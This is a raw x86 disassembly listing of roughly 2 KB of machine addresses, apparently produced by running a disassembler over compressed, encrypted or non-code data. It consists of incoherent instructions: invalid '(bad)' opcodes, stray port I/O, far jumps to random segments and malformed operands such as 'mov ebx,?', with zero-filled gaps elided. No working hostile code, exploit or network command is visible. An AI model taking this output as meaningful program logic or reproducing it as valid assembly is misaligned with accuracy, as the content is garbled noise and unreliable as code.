  41dce5:	sub    BYTE PTR [esp+esi*8-0x18708ace],bh
  41dcec:	jp     0x41dd47
  41dcee:	dec    ecx
  41dcef:	loope  0x41dd4c
  41dcf1:	add    BYTE PTR [edi-0x617aa049],dh
  41dcf7:	or     bh,BYTE PTR [eax+0x3a]
  41dcfa:	lahf   
  41dcfb:	imul   edi,DWORD PTR [eax+0x5d6542c7],0x728e7cad
  41dd05:	out    0xe6,al
  41dd07:	lods   al,BYTE PTR ds:[esi]
  41dd08:	aaa    
  41dd09:	adc    BYTE PTR [eax-0x157260b7],ch
  41dd0f:	lahf   
  41dd10:	sahf   
  41dd11:	inc    eax
  41dd12:	adc    DWORD PTR [ebp-0x62d8f3af],ecx
  41dd18:	jae    0x41dd98
  41dd1a:	(bad)
  41dd1d:	ins    DWORD PTR es:[edi],dx
  41dd1e:	lahf   
  41dd1f:	in     eax,0xd3
  41dd21:	std    
  41dd22:	mov    WORD PTR [edi+0x10],cs
  41dd25:	mov    dl,0x3a
  41dd27:	adc    BYTE PTR [esi+0x27743bdb],dl
  41dd2d:	sub    ah,BYTE PTR [ecx-0x4e]
  41dd30:	and    eax,0xab4d4a17
  41dd35:	adc    cl,BYTE PTR [esi-0x9]
  41dd38:	mov    ebx,0xd51d707b
  41dd3d:	scas   al,BYTE PTR es:[edi]
  41dd3e:	(bad)  
  41dd3f:	in     al,dx
  41dd40:	inc    eax
  41dd41:	cmp    eax,0xe89fd113
  41dd46:	aad    0x27
  41dd48:	out    0x97,al
  41dd4a:	inc    ebp
  41dd4b:	adc    al,0xbf
  41dd4d:	xor    edx,DWORD PTR [ebx]
  41dd4f:	lods   al,BYTE PTR ds:[esi]
  41dd50:	pop    esp
  41dd51:	sub    bl,BYTE PTR [ebx+0x6f]
  41dd54:	rcr    BYTE PTR [esi*8+0x1bb76b02],1
  41dd5b:	imul   ecx,DWORD PTR ds:[edi+0x7a183bdf],0xfd247fa9
  41dd66:	js     0x41ddd9
  41dd68:	fisttp DWORD PTR [edi+0x62]
  41dd6b:	ror    BYTE PTR [ecx+0x67c89d8b],cl
  41dd71:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dd72:	sti    
  41dd73:	mov    ds:0x766e911a,al
  41dd78:	xchg   esp,eax
  41dd79:	xchg   edi,eax
  41dd7a:	lea    edi,[ebp+ecx*2+0xa49eed3]
  41dd81:	out    dx,al
  41dd82:	push   ds
  41dd83:	cmp    eax,0x58069d3a
  41dd88:	ror    bh,1
  41dd8a:	ret    0x97b3
  41dd8d:	loop   0x41de01
  41dd8f:	(bad)  ds:0x6f4664a6
  41dd95:	xchg   esi,eax
  41dd96:	push   edx
  41dd97:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dd98:	stc    
  41dd99:	arpl   sp,bp
  41dd9b:	js     0x41ddc1
  41dd9d:	mov    esp,edi
  41dd9f:	or     ah,BYTE PTR [ebx]
  41dda1:	mov    ebx,?
  41dda3:	mov    al,ds:0xff755d4c
  41dda8:	pop    esp
  41dda9:	dec    ebx
  41ddaa:	cmp    BYTE PTR [ebx],dh
  41ddac:	aas    
  41ddad:	js     0x41de0b
  41ddaf:	stos   DWORD PTR es:[edi],eax
  41ddb0:	xor    ch,bh
  41ddb2:	dec    esp
  41ddb3:	mov    ah,0x1f
  41ddb5:	ret    
  41ddb6:	pop    ss
  41ddb7:	imul   eax,DWORD PTR [edi-0x37],0xffffffbb
  41ddbb:	xor    eax,0x9df8b8a2
  41ddc0:	cmc    
  41ddc1:	data16 add BYTE PTR [eax],al
	...
  41de34:	pop    es
  41de35:	jp     0x41de1f
  41de37:	jnp    0x41de36
  41de39:	sti    
  41de3a:	xchg   edi,eax
  41de3b:	jle    0x41ddf3
  41de3d:	popf   
  41de3e:	loopne 0x41ddc2
  41de40:	mov    edi,DWORD PTR [edi]
  41de42:	mov    ebp,0x141cc55
  41de47:	add    dh,dh
  41de49:	add    BYTE PTR [eax],al
  41de4b:	add    BYTE PTR [ebx-0x35],bl
  41de4e:	fcom   QWORD PTR [edx-0x50]
  41de51:	and    ebx,DWORD PTR [eax]
  41de53:	retfw  0x4c6e
  41de57:	rcl    ch,1
  41de59:	cmp    al,0x41
  41de5b:	or     ah,BYTE PTR [esp+ebx*8+0x3b]
  41de5f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41de60:	adc    edx,DWORD PTR [esi+0x25431635]
  41de66:	pop    eax
  41de67:	mov    ah,0xa7
  41de69:	shl    bh,cl
  41de6b:	xor    eax,eax
  41de6d:	aas    
  41de6e:	adc    DWORD PTR [ecx-0x43ddcf03],esp
  41de74:	test   DWORD PTR cs:[ecx+0x1],ecx
  41de78:	fdiv   DWORD PTR [edx-0x3d]
  41de7b:	daa    
  41de7c:	fbld   TBYTE PTR [ebp-0xb]
  41de7f:	outs   dx,BYTE PTR ds:[esi]
  41de80:	push   ss
  41de81:	mov    dh,0xa7
  41de83:	add    edx,ebx
  41de85:	cdq    
  41de86:	pop    eax
  41de87:	push   ebx
  41de88:	les    ecx,FWORD PTR [edx+ebp*4]
  41de8b:	jbe    0x41dea1
  41de8d:	sbb    eax,0x50174332
  41de92:	ss int3 
  41de94:	jle    0x41deac
  41de96:	(bad)  
  41de97:	and    ch,BYTE PTR [esi-0x663a7dae]
  41de9d:	jp     0x41dea1
  41de9f:	inc    ecx
  41dea0:	pusha  
  41dea1:	out    0xf2,eax
  41dea3:	pop    es
  41dea4:	mov    cl,BYTE PTR [eax-0x5058639a]
  41deaa:	adc    esi,ebp
  41deac:	imul   esp,DWORD PTR [ebx+0x2b],0xffffffea
  41deb0:	sub    cl,BYTE PTR [eax-0xc08f4ac]
  41deb6:	outs   dx,BYTE PTR ds:[esi]
  41deb7:	adc    DWORD PTR [esi-0x27],eax
  41deba:	push   ebx
  41debb:	aad    0xc4
  41debd:	and    eax,0xd0bac3bc
  41dec2:	xchg   esi,eax
  41dec3:	dec    ebp
  41dec4:	or     BYTE PTR [eax-0x35],bl
  41dec7:	shl    dh,1
  41dec9:	scas   al,BYTE PTR es:[edi]
  41deca:	lea    ebp,[ebp+0x56]
  41decd:	push   ds
  41dece:	test   DWORD PTR [ebp+ecx*2-0x2079593e],edi
  41ded5:	add    DWORD PTR [ebx],ebx
  41ded7:	or     BYTE PTR [esi+0x7],0x93
  41dedb:	test   al,0x99
  41dedd:	or     eax,0x48573a80
  41dee2:	retf   0x3a7b
  41dee5:	ds je  0x41df0b
  41dee8:	inc    ecx
  41dee9:	and    BYTE PTR [ebx+ecx*2-0x286e90a3],dh
  41def0:	cmp    DWORD PTR [edx+eax*8-0x8],eax
  41def4:	xor    eax,DWORD PTR [eax-0x65]
  41def7:	sub    DWORD PTR [ebx+0x7688f6a3],0xfffffffa
  41defe:	icebp  
  41deff:	pop    esi
  41df00:	xchg   esp,eax
  41df01:	mov    eax,ds:0x3323a4c8
  41df06:	or     dh,ch
  41df08:	mov    ebx,0x911edebe
  41df0d:	ret    0xfbc1
  41df10:	add    DWORD PTR [edi],ebx
  41df12:	ret    0x16e7
  41df15:	aam    0x37
  41df17:	cwde   
  41df18:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41df19:	stc    
  41df1a:	push   edi
  41df1b:	jb     0x41df7d
  41df1d:	jns    0x41deb2
  41df1f:	xchg   eax,edx
  41df21:	pushf  
  41df22:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41df23:	(bad)  
  41df24:	fistp  DWORD PTR ds:0x6391b83d
  41df2a:	push   cs
  41df2b:	push   ecx
  41df2c:	aas    
  41df2d:	jp     0x41dec6
  41df2f:	cmp    DWORD PTR [eax-0x57c889dd],0x9c787ebd
  41df39:	xchg   esp,eax
  41df3a:	(bad)  
  41df3b:	and    DWORD PTR [edx+0x7],edx
  41df3e:	fwait
  41df3f:	pop    edi
  41df40:	retf   
  41df41:	or     BYTE PTR [eax],al
	...
  41dfb3:	add    BYTE PTR [ecx-0x52bcdfcc],bh
  41dfb9:	push   edi
  41dfba:	sti    
  41dfbb:	(bad)  
  41dfbc:	loopne 0x41df65
  41dfbe:	cmp    ebx,DWORD PTR [esi]
  41dfc0:	jbe    0x41df67
  41dfc2:	jle    0x41df91
  41dfc4:	ret    0x142
  41dfc7:	add    dh,dh
  41dfc9:	add    BYTE PTR [eax],al
  41dfcb:	add    BYTE PTR [edi],dh
  41dfcd:	push   ecx
  41dfce:	push   esp
  41dfcf:	xor    eax,0xf7e96218
  41dfd4:	in     al,dx
  41dfd5:	addr16 push 0x222b692f
  41dfdb:	sub    dh,BYTE PTR [eax]
  41dfdd:	dec    ecx
  41dfde:	and    esp,DWORD PTR [ebp+0x37]
  41dfe1:	or     ah,ah
  41dfe3:	adc    al,0x5e
  41dfe5:	mov    bh,0x94
  41dfe7:	mov    bl,ah
  41dfe9:	jb     0x41e03c
  41dfeb:	push   ebp
  41dfec:	ins    BYTE PTR es:[edi],dx
  41dfed:	in     al,0x48
  41dfef:	adc    BYTE PTR [ebx+0x4d18ee73],cl
  41dff5:	jb     0x41e027
  41dff7:	jmp    0x41dfd2
  41dff9:	fs leave 
  41dffb:	fnsave [ecx+0x70ee8eab]
  41e001:	mov    al,0x69
  41e003:	lods   eax,DWORD PTR ds:[esi]
  41e004:	addr16 loope 0x41dfd6
  41e007:	jle    0x41dfbd
  41e009:	jo     0x41e078
  41e00b:	adc    edx,DWORD PTR [eax-0x5d]
  41e00e:	mov    cs,WORD PTR [eax+0x66cf586c]
  41e014:	mov    al,0x9b
  41e016:	(bad)  
  41e017:	xor    DWORD PTR [edi+eax*8],esi
  41e01a:	add    al,0xa
  41e01c:	cdq    
  41e01d:	jo     0x41e021
  41e01f:	cmp    BYTE PTR [edx+0x21f44ec3],0x6e
  41e026:	adc    eax,0x8db80754
  41e02c:	ins    DWORD PTR es:[edi],dx
  41e02d:	and    ebp,DWORD PTR [edx]
  41e02f:	inc    esp
  41e030:	cmp    BYTE PTR [edx-0xf64e9fd],cl
  41e036:	sahf   
  41e037:	mov    ch,0x49
  41e039:	xor    esp,DWORD PTR [edi]
  41e03b:	adc    eax,0xaa85f8f9
  41e040:	cmp    al,0x83
  41e042:	out    0x38,al
  41e044:	test   DWORD PTR [ecx+0x22],esp
  41e047:	xor    DWORD PTR ds:0x797e6b12,edi
  41e04d:	and    ecx,ebx
  41e04f:	jmp    0x41e0b2
  41e051:	fild   QWORD PTR [ecx+ecx*4]
  41e054:	test   DWORD PTR [edi],edx
  41e056:	lods   al,BYTE PTR ds:[esi]
  41e057:	sbb    al,0xc1
  41e059:	in     al,0x43
  41e05b:	mov    al,0xc3
  41e05d:	call   0xed95:0x26f4975
  41e064:	ret    
  41e065:	mov    ebp,0x6063d0cf
  41e06a:	xlat   BYTE PTR ds:[ebx]
  41e06b:	inc    edi
  41e06c:	outs   dx,BYTE PTR ds:[esi]
  41e06d:	cli    
  41e06e:	test   DWORD PTR [esi],ebx
  41e070:	mov    dh,0xb6
  41e072:	push   ds
  41e073:	fwait
  41e074:	pop    ss
  41e075:	mov    bh,0x92
  41e077:	cmc    
  41e078:	fnstenv [esi-0x47dec3a5]
  41e07e:	or     al,0xa9
  41e080:	adc    DWORD PTR [edi],edi
  41e082:	mov    bh,0x90
  41e084:	rol    BYTE PTR [ebx],1
  41e086:	adc    eax,0x98eb2847
  41e08b:	xor    esp,eax
  41e08d:	sbb    eax,0x2bab6b2c
  41e092:	or     al,0xf7
  41e094:	push   0xab7f2544
  41e099:	loope  0x41e0bb
  41e09b:	inc    DWORD PTR ds:0x5a796bb2
  41e0a1:	gs test eax,0x2e36290
  41e0a7:	dec    esi
  41e0a8:	mov    bh,0x3c
  41e0aa:	aaa    
  41e0ab:	cmovs  ecx,esp
  41e0ae:	out    0x56,eax
  41e0b0:	sbb    BYTE PTR [edi+edx*2],bh
  41e0b3:	cli    
  41e0b4:	xchg   esp,eax
  41e0b5:	cmp    ah,BYTE PTR [edx+0x7693752d]
  41e0bb:	sub    ah,ch
  41e0bd:	lds    edx,FWORD PTR ds:0x80bcfe
	...
  41e133:	add    BYTE PTR [eax-0x3d],dl
  41e136:	cmp    ecx,DWORD PTR ds:0xdf76fdbb
  41e13c:	and    al,0x13
  41e13e:	push   ss
  41e13f:	dec    edi
  41e140:	jae    0x41e179
  41e142:	mov    edx,0x143b8d7
  41e147:	add    dh,dh
  41e149:	add    BYTE PTR [eax],al
  41e14b:	add    BYTE PTR [ecx-0x3e4a9b08],ah
  41e151:	pop    ecx
  41e152:	scas   al,BYTE PTR es:[edi]
  41e153:	jle    0x41e0e3
  41e155:	mov    ?,edx
  41e157:	or     BYTE PTR [edi+ebx*4],bh
  41e15a:	fst    QWORD PTR [esi+0x7abdf2b1]
  41e160:	sbb    eax,0x2301ea89
  41e165:	dec    ebx
  41e166:	mov    DWORD PTR [edx],0xf7df56a1
  41e16c:	or     eax,0xc795dece
  41e171:	jle    0x41e18f
  41e173:	test   eax,0x23f810c1
  41e178:	adc    al,0x77
  41e17a:	or     BYTE PTR [eax+eax*4],ch
  41e17d:	addr16 pusha 
  41e17f:	test   al,0x84
  41e181:	push   ds
  41e182:	xor    eax,0x15a4b03a
  41e187:	fs pop ebp
  41e189:	sahf   
  41e18a:	call   0x444a:0x34d10724
  41e191:	cmp    ch,dl
  41e193:	data16 es and al,0xb5
  41e197:	pop    ebp
  41e198:	xlat   BYTE PTR ds:[ebx]
  41e199:	in     al,dx
  41e19a:	fiadd  DWORD PTR [ecx+0x49]
  41e19d:	push   ecx
  41e19e:	int    0x8f
  41e1a0:	sbb    bh,BYTE PTR [esi]
  41e1a2:	pop    ecx
  41e1a3:	ss mov ebp,0x5a64c4c0
  41e1a9:	popf   
  41e1aa:	(bad)  
  41e1ab:	or     esi,DWORD PTR [edi+0x6f]
  41e1ae:	xchg   esi,eax
  41e1af:	aad    0xf1
  41e1b1:	and    esi,DWORD PTR [ebp+eiz*8-0x30]
  41e1b5:	je     0x41e17a
  41e1b7:	aas    
  41e1b8:	lods   al,BYTE PTR ds:[esi]
  41e1b9:	inc    ebp
  41e1ba:	xor    eax,DWORD PTR [edi+0x4570380f]
  41e1c0:	add    BYTE PTR [eax+0x305b93b0],dh
  41e1c6:	mov    eax,0x6741c866
  41e1cb:	arpl   WORD PTR [ebx],si
  41e1cd:	call   0x26a2dc6f
  41e1d2:	div    BYTE PTR [ebx+0x40e8df10]
  41e1d8:	sbb    al,0xac
  41e1da:	dec    ebp
  41e1db:	mov    al,0xc0
  41e1dd:	iret   
  41e1de:	sub    eax,0xfc54d4ef
  41e1e3:	adc    ch,dl
  41e1e5:	cmp    al,0x95
  41e1e7:	cld    
  41e1e8:	popa   
  41e1e9:	stos   DWORD PTR es:[edi],eax
  41e1ea:	imul   ebp,DWORD PTR [edi],0xa5280a8a
  41e1f0:	sahf   
  41e1f1:	lds    esp,FWORD PTR [ebx+0x75e5fe14]
  41e1f7:	ret    0xfb89
  41e1fa:	inc    esi
  41e1fb:	xor    DWORD PTR [esi+0x7c9f6760],edi
  41e201:	in     eax,0x67
  41e203:	not    DWORD PTR [edi+ebx*1+0x7abfd5b7]
  41e20a:	shr    BYTE PTR [edx+0x5e],cl
  41e20d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e20e:	int3   
  41e20f:	inc    eax
  41e210:	or     al,0x27
  41e212:	xor    eax,eax
  41e214:	cli    
  41e215:	push   ebp
  41e216:	(bad)  
  41e217:	jbe    0x41e26e
  41e219:	sub    eax,0xb5dd6a9d
  41e21e:	pop    ebx
  41e21f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e220:	xor    edi,eax
  41e222:	int3   
  41e223:	loopne 0x41e244
  41e225:	adc    esi,DWORD PTR [ebp-0xa5eb745]
  41e22b:	pop    ebp
  41e22c:	mov    al,ds:0xc1dea20f
  41e231:	and    DWORD PTR [eax+0xaebb97c],ebx
  41e237:	mov    DWORD PTR [ecx-0x7c],ecx
  41e23a:	mov    edx,DWORD PTR [edi]
  41e23c:	pusha  
  41e23d:	mov    dl,0xa4
  41e23f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e240:	or     ebp,edx
	...
  41e2b2:	add    BYTE PTR [eax],al
  41e2b4:	inc    BYTE PTR [eax+0x7dff54f9]
  41e2ba:	jmp    FWORD PTR [edx+0x7b6356a5]
  41e2c0:	fcomip st,st(5)
  41e2c2:	mov    fs,WORD PTR [ecx]
  41e2c4:	scas   al,BYTE PTR es:[edi]
  41e2c5:	inc    esp
  41e2c6:	add    DWORD PTR [eax],eax
  41e2c8:	test   BYTE PTR [eax],0x0
  41e2cb:	add    BYTE PTR [eax-0x37021bb0],dh
  41e2d1:	outs   dx,DWORD PTR ds:[esi]
  41e2d2:	ss sahf 
  41e2d4:	jmp    0xf5a22775
  41e2d9:	mov    ch,0x9c
  41e2db:	xchg   esi,eax
  41e2dc:	add    ebx,ecx
  41e2de:	jbe    0x41e26e
  41e2e0:	add    DWORD PTR [edx+0x39],eax
  41e2e3:	clc    
  41e2e4:	and    ecx,DWORD PTR [esi]
  41e2e6:	or     edi,DWORD PTR [edx-0x12]
  41e2e9:	mov    es,WORD PTR [esi+0x503945b1]
  41e2ef:	into   
  41e2f0:	int    0x51
  41e2f2:	leave  
  41e2f3:	sub    cl,ah
  41e2f5:	add    BYTE PTR [ebp+0x65],ah
  41e2f8:	shl    eax,1
  41e2fa:	adc    esp,esi
  41e2fc:	not    BYTE PTR [ebx+0x2c42f83a]
  41e302:	scas   eax,DWORD PTR es:[edi]
  41e303:	(bad)  
  41e304:	cmp    DWORD PTR [ebp-0x72],0x79
  41e308:	mov    cl,0xc3
  41e30a:	and    bh,BYTE PTR [edi]
  41e30c:	sbb    al,0x65
  41e30e:	mov    eax,ds:0x83f678ce
  41e313:	and    eax,0x20ed97b4
  41e318:	or     ebp,DWORD PTR [ecx-0x4b9c5aa3]
  41e31e:	xor    cl,BYTE PTR [esi]
  41e320:	pop    ss
  41e321:	rol    DWORD PTR [edx-0x41dd098a],cl
  41e327:	sub    al,bl
  41e329:	cmp    eax,0xeb047c77
  41e32e:	pop    esi
  41e32f:	or     al,0xe2
  41e331:	pop    esp
  41e332:	fadd   DWORD PTR [ebx-0x52]
  41e335:	xchg   ebp,eax
  41e336:	jmp    0xe261dc84
  41e33b:	cli    
  41e33c:	mul    DWORD PTR [eax+0x16]
  41e33f:	mov    gs,ebx
  41e341:	push   0xffffff9d
  41e343:	fstp   DWORD PTR [ebp-0x58053198]
  41e349:	and    ebp,DWORD PTR [ebx]
  41e34b:	test   DWORD PTR [eax-0x39],esi
  41e34e:	sbb    al,0x4
  41e350:	pop    ss
  41e351:	mov    edx,0x1a8e7bd4
  41e356:	in     eax,dx
  41e357:	or     al,cl
  41e359:	std    
  41e35a:	fcomp  QWORD PTR [ecx-0x70]
  41e35d:	cwde   
  41e35e:	lock scas al,BYTE PTR es:[edi]
  41e360:	jo     0x41e37b
  41e362:	das    
  41e363:	dec    edx
  41e364:	loop   0x41e3ca
  41e366:	or     esi,DWORD PTR [edi-0x3510854a]
  41e36c:	leave  
  41e36d:	mov    ds:0x6c737d53,al
  41e372:	xchg   edx,eax
  41e373:	add    al,0x88
  41e375:	shl    BYTE PTR [eax+0x7783b426],1
  41e37b:	push   esp
  41e37c:	imul   edi,DWORD PTR ds:0x3242f8c9,0xffffffd8
  41e383:	bound  ebx,QWORD PTR [esi-0x85ae9ff]
  41e389:	dec    ebx
  41e38a:	mov    ch,0xd9
  41e38c:	jns    0x41e3ee
  41e38e:	dec    edi
  41e38f:	fld    QWORD PTR [esp+edi*2+0x52]
  41e393:	in     eax,0xab
  41e395:	call   FWORD PTR [edx-0x2c]
  41e398:	(bad)  
  41e39a:	or     edx,DWORD PTR [ebp+0x62f98ea9]
  41e3a0:	js     0x41e3b1
  41e3a2:	jnp    0x41e339
  41e3a4:	cld    
  41e3a5:	dec    esp
  41e3a6:	and    dl,BYTE PTR [edi]
  41e3a8:	sub    eax,0xaa7bb484
  41e3ad:	std    
  41e3ae:	imul   eax,DWORD PTR [esi],0xb
  41e3b1:	jne    0x41e3db
  41e3b3:	and    dl,dh
  41e3b5:	jp     0x41e429
  41e3b7:	imul   edi,DWORD PTR [ecx-0x2547b2b7],0xf321725d
  41e3c1:	stos   DWORD PTR es:[edi],eax
	...
  41e432:	add    BYTE PTR [eax],al
  41e434:	div    BYTE PTR [esi]
  41e436:	rcl    BYTE PTR [edx+edx*8+0x1576f6f4],cl
  41e43d:	mov    ds:0xb7a3fead,al
  41e442:	and    dl,ah
  41e444:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e445:	inc    ebp
  41e446:	add    DWORD PTR [eax],eax
  41e448:	test   BYTE PTR [eax],0x0
  41e44b:	add    BYTE PTR [ebx-0x38],bh
  41e44e:	cmp    al,0xee
  41e450:	ins    BYTE PTR es:[edi],dx
  41e451:	pop    ss
  41e452:	mov    bl,0x38
  41e454:	sub    DWORD PTR [edx],0xffffffa4
  41e457:	dec    esp
  41e458:	dec    edi
  41e459:	jmp    FWORD PTR [edx+0x74e754e4]
  41e45f:	dec    ebx
  41e460:	scas   eax,DWORD PTR es:[edi]
  41e461:	xchg   ebp,eax
  41e462:	mov    bh,0x6f
  41e464:	sti    
  41e465:	xchg   esp,eax
  41e466:	(bad)  [esi+0x50]
  41e469:	add    eax,0x1cccdd14
  41e46e:	scas   al,BYTE PTR es:[edi]
  41e46f:	sbb    eax,0x344572c6
  41e474:	sub    eax,0xbfb385fc
  41e479:	icebp  
  41e47a:	(bad)  
  41e47b:	imul   eax,edi,0x49
  41e47e:	fist   WORD PTR [ecx-0x29]
  41e481:	fidivr WORD PTR [ebp+0x4a3e0864]
  41e487:	xchg   esi,eax
  41e488:	xchg   edi,eax
  41e489:	mov    ah,0x52
  41e48b:	sub    eax,0xcc8f9cb
  41e490:	add    esp,DWORD PTR [ecx+edi*1+0x67ef0c00]
  41e497:	test   eax,0xff97fc0c
  41e49c:	ins    DWORD PTR es:[edi],dx
  41e49d:	in     al,0xa3
  41e49f:	mov    dl,0xa
  41e4a1:	sbb    bl,dh
  41e4a3:	lods   eax,DWORD PTR ds:[esi]
  41e4a4:	jmp    0x866:0xcf391fd7
  41e4ab:	int3   
  41e4ac:	xor    eax,0x8cee541c
  41e4b1:	sub    DWORD PTR [edx+ebx*8],ebp
  41e4b4:	(bad)  
  41e4b5:	pop    ds
  41e4b6:	mov    BYTE PTR [ebp-0x54],ch
  41e4b9:	scas   eax,DWORD PTR es:[edi]
  41e4ba:	outs   dx,BYTE PTR ds:[esi]
  41e4bb:	sub    eax,0xe53e5621
  41e4c0:	jno    0x41e4ee
  41e4c2:	clc    
  41e4c3:	add    al,0x54
  41e4c5:	dec    edx
  41e4c6:	cwde   
  41e4c7:	ret    
  41e4c8:	call   0xe304111
  41e4cd:	pop    edx
  41e4ce:	push   cs
  41e4cf:	test   BYTE PTR [eax],bh
  41e4d1:	mov    edx,0x7878bd57
  41e4d6:	sub    eax,0x7d328ff6
  41e4db:	out    0x21,eax
  41e4dd:	add    al,0x1f
  41e4df:	aas    
  41e4e0:	cdq    
  41e4e1:	sub    edx,DWORD PTR ds:0xea814c65
  41e4e7:	sar    DWORD PTR [edi-0x345efbfa],1
  41e4ed:	dec    eax
  41e4ee:	in     eax,dx
  41e4ef:	pushf  
  41e4f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e4f1:	pop    esp
  41e4f2:	or     BYTE PTR [esi+0x604afdde],ah
  41e4f8:	nop
  41e4f9:	outs   dx,BYTE PTR ds:[esi]
  41e4fa:	test   BYTE PTR [esi],ah
  41e4fc:	xchg   edi,eax
  41e4fe:	adc    ebp,DWORD PTR [ebx]
  41e500:	fnstenv [eax+0x19]
  41e503:	sbb    bh,BYTE PTR [edx-0x12]
  41e506:	jmp    0xcfcee8e1
  41e50b:	xchg   ebx,eax
  41e50c:	mov    eax,0xc9192a7a
  41e511:	add    BYTE PTR [esi-0x4c],0x66
  41e515:	stos   DWORD PTR es:[edi],eax
  41e516:	xor    al,0xa0
  41e518:	jge    0x41e4eb
  41e51a:	jne    0x41e4a8
  41e51c:	les    ecx,FWORD PTR [esi]
  41e51e:	loop   0x41e4e1
  41e520:	cmp    DWORD PTR [eax-0x7ef1206f],esp
  41e526:	sub    al,0xc5
  41e528:	adc    ebp,ecx
  41e52a:	xchg   edi,eax
  41e52b:	push   0x24
  41e52d:	repnz sbb DWORD PTR [ebp+0x13],edx
  41e531:	sub    BYTE PTR [ecx+0x25],bl
  41e534:	jbe    0x41e4f7
  41e536:	sbb    al,0xfa
  41e538:	xchg   edx,ebp
  41e53a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e53b:	clc    
  41e53c:	adc    BYTE PTR [edi+0x685991af],dl
	...
  41e5b2:	add    BYTE PTR [eax],al
  41e5b4:	jl     0x41e54f
  41e5b6:	dec    esp
  41e5b7:	jbe    0x41e5a6
  41e5b9:	idiv   DWORD PTR [esi-0x65]
  41e5bc:	ss adc al,0xc3
  41e5bf:	repz loop 0x41e549
  41e5c2:	and    ecx,DWORD PTR [edx+ebx*4]
  41e5c5:	inc    esi
  41e5c6:	add    DWORD PTR [eax],eax
  41e5c8:	test   BYTE PTR [eax],0x0
  41e5cb:	add    BYTE PTR [ebx+0x53d717d2],cl
  41e5d1:	cdq    
  41e5d2:	ret    0x70b4
  41e5d5:	dec    edi
  41e5d6:	cs out 0xa3,al
  41e5d9:	aas    
  41e5da:	cmp    eax,0x29e4b434
  41e5df:	cmc    
  41e5e0:	sub    eax,0x18f6b616
  41e5e5:	jmp    0x57a4ebed
  41e5ea:	cwde   
  41e5eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e5ec:	jb     0x41e650
  41e5ee:	push   0x77b91e6d
  41e5f3:	in     al,dx
  41e5f4:	xchg   edi,eax
  41e5f5:	xchg   ecx,eax
  41e5f6:	lds    ecx,FWORD PTR [edx+esi*4]
  41e5f9:	push   ebp
  41e5fa:	adc    edx,DWORD PTR [ebx]
  41e5fc:	sbb    edi,edx
  41e5fe:	aaa    
  41e5ff:	or     esp,DWORD PTR fs:[edi]
  41e602:	test   al,0xf8
  41e604:	sbb    BYTE PTR [eax-0x22],ah
  41e607:	lea    ebx,[ecx-0x46]
  41e60a:	push   0x6e
  41e60c:	or     al,cl
  41e60e:	fisttp WORD PTR [ebx]
  41e610:	push   ds
  41e611:	jmp    0xdc28:0x47f029e8
  41e618:	mov    edi,0x76f986aa
  41e61d:	inc    esp
  41e61e:	int    0x83
  41e620:	push   ebp
  41e621:	mov    dl,0x62
  41e623:	inc    edi
  41e624:	out    dx,al
  41e625:	mov    ds:0x94ce896,al
  41e62a:	or     DWORD PTR [eax+0x4fcc07c4],ebx
  41e630:	cmp    dl,al
  41e632:	mov    esi,0xa9cd6af4
  41e637:	jecxz  0x41e5ed
  41e639:	or     al,BYTE PTR [edx]
  41e63b:	(bad)  [eax]
  41e63d:	and    eax,0x9d9c7651
  41e642:	and    ch,BYTE PTR [ebp+0x3900365c]
  41e648:	or     eax,0x948ca397
  41e64d:	inc    esp
  41e64e:	test   BYTE PTR [edx+0x57],bh
  41e651:	stos   BYTE PTR es:[edi],al
  41e652:	leave  
  41e653:	push   esp
  41e654:	imul   edx,DWORD PTR [ebx+0x14],0xe8f5947c
  41e65b:	scas   al,BYTE PTR es:[edi]
  41e65c:	mov    ch,0x32
  41e65e:	mov    ch,0xf3
  41e660:	dec    ebp
  41e661:	daa    
  41e662:	lea    esi,[ebx]
  41e664:	or     eax,0x73697f7c
  41e669:	lock ror DWORD PTR [ebp+0x67a09c89],0xee
  41e671:	xor    edx,edi
  41e673:	inc    ecx
  41e674:	aaa    
  41e675:	mov    al,ds:0xd22916df
  41e67a:	pop    edi
  41e67b:	mov    al,0xde
  41e67d:	cwde   
  41e67e:	mov    edx,0x1801c7a7
  41e683:	mov    al,0xa1
  41e685:	ret    
  41e686:	sub    DWORD PTR [eax],ebx
  41e688:	push   es
  41e689:	dec    edx
  41e68a:	jb     0x41e6f2
  41e68c:	leave  
  41e68d:	jae    0x41e6bd
  41e68f:	retf   
  41e690:	into   
  41e691:	in     eax,dx
  41e692:	mov    DWORD PTR [eax+0x2a44bead],edi
  41e698:	xchg   BYTE PTR [ebx],ah
  41e69a:	dec    esp
  41e69b:	push   ss
  41e69c:	jg     0x41e6d2
  41e69e:	push   cs
  41e69f:	jb     0x41e705
  41e6a1:	xchg   edi,eax
  41e6a2:	or     eax,0xb1ed3fdb
  41e6a7:	ja     0x41e6db
  41e6a9:	aad    0x97
  41e6ab:	fwait
  41e6ac:	retf   
  41e6ad:	or     ah,BYTE PTR [esp+ebx*1]
  41e6b0:	(bad)  
  41e6b1:	push   edi
  41e6b2:	imul   esp,ebp,0xffffffa8
  41e6b5:	out    0x70,eax
  41e6b7:	jbe    0x41e690
  41e6b9:	jno    0x41e6c7
  41e6bb:	ins    BYTE PTR es:[edi],dx
  41e6bc:	fild   DWORD PTR [ecx+0x5330ccef]
	...
  41e732:	add    BYTE PTR [eax],al
  41e734:	and    al,0xce
  41e736:	outs   dx,BYTE PTR ds:[esi]
  41e737:	sub    ch,dh
  41e739:	stos   BYTE PTR es:[edi],al
  41e73a:	fs into 
  41e73c:	cmp    al,0xb2
  41e73e:	xor    ebp,DWORD PTR [ebx-0x63a28363]
  41e744:	nop
  41e745:	inc    edi
  41e746:	add    DWORD PTR [eax],eax
  41e748:	test   BYTE PTR [eax],0x0
  41e74b:	add    dl,al
  41e74d:	(bad)  
  41e74e:	dec    ecx
  41e74f:	adc    BYTE PTR [edx],0xfe
  41e752:	popa   
  41e753:	test   eax,0xedf67741
  41e758:	inc    ecx
